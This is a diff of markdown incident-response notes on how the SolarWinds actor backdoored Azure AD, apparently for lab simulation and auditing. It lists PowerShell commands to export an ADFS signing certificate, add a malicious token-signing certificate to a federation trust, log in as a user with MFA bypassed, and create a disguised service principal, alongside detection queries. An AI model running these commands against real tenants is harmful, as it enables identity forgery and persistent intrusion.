@@ -1,10 +1,26 @@
 # Azure AD Incident Response
 
-Rough notes for understanding the modifications the actor made to Azure AD to facilitate long-term access. Two methods were observed: 
+Rough notes for understanding the modifications the Solarwinds actor made to Azure AD to facilitate long-term access. The two techniques were observed: 
 * Abusing federation trusts - adding new federation trusts, modifying existing federation trusts to add new token-signing certificates
 * Abusing service principals - adding credentials to existing service principals, adding new service principals with credentials, adding permissions to service principals and applications to access Microsoft Graph API
 
-The actor was also seen stealing ADFS token-signing certificates to forge SAML tokens and facilitate long-term access. 
+Also on a third technique the actor was observed using to facilite long term access, stealing ADFS token-signing certificates to forge SAML tokens.
+
+- [Notes for simulating attacks in a lab](#notes-for-simulating-attacks-in-a-lab)
+  * [Exporting an ADFS certificate](#exporting-an-adfs-certificate)
+  * [Modifying an existing federation trust](#modifying-an-existing-federation-trust)
+  * [Adding a malicious federation trust](#adding-a-malicious-federation-trust)
+  * [Adding credentials to a service principle](#adding-credentials-to-a-service-principle)
+    - [Certificate](#certificate)
+    - [Password](#password)
+  * [Creating a new service principle](#creating-a-new-service-principle)
+- [Auditing for backdoors](#auditing-for-backdoors)
+  * [Commands to manually audit federation trusts](#commands-to-manually-audit-federation-trusts)
+  * [Commands to manually service principals with credentials](#commands-to-manually-service-principals-with-credentials)
+  * [Commands to manually search for service principals with credentials and risky permissions](#commands-to-manually-search-for-service-principals-with-credentials-and-risky-permissions)
+  * [Data sources](#data-sources)
+  * [Other useful commands](#other-useful-commands)
+- [Further references](#further-references)
 
 Background reading on defending against the threat: 
 * [Microsoft technical blog on SolarWinds attacks](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)
@@ -28,7 +44,7 @@ Background reading on defending against the threat:
 * Create and configure a test application in Azure AD, configure Mail.Read permissions. Use the web application quick-start to log-in test users to the app and require them to consent access to their data. 
 * Create and configure a test application in Azure AD, configure Mail.Read permissions. Grant [admin consent](https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent) to the applicaiton. 
 
-### Export ADFS certificate
+### Exporting an ADFS certificate
 
 PS> Export-AADIntADFSSigningCertificate -filename ADFSSigningCertificate.pfx  
 
@@ -48,6 +64,18 @@ PS> \[xml\]$xml=$settings
 
 You can also use ADFSDump https://github.com/fireeye/ADFSDump
 
+### Modifying an existing federation trust
+
+
+PS> Get-MSOLUser | Where-Object{$\_.DisplayName -eq 'Will'} | select UserPrincipalName, ImmutableId  
+PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select IssuerUri  
+PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
+PS> Set-MsolDomainFederationSettings -DomainName $domainname -NextSigningCertificate $malicious_cert  
+PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
+PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer $issueruri  
+
+AuditLogs | where OperationName =~ "Set federation settings on domain"
+
 ### Adding a malicious federation trust
 
 PS> Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
@@ -57,9 +85,6 @@ PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMF
 
 Creates the Azure AD audit log:
 AuditLogs | where OperationName =~ "Set domain authentication"
-
-Updaing a token-signing certificate on an existing trust creates the event:
-AuditLogs | where OperationName =~ "Set federation settings on domain" 
 
 ### Adding credentials to a service principle 
 
@@ -81,7 +106,7 @@ PS> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDat
 Creates the log:
 AuditLogs | where OperationName =~ "Add service principal credentials"
 
-#### Create a new service principle 
+### Creating a new service principle 
 
 PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null}  
 PS> $sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  
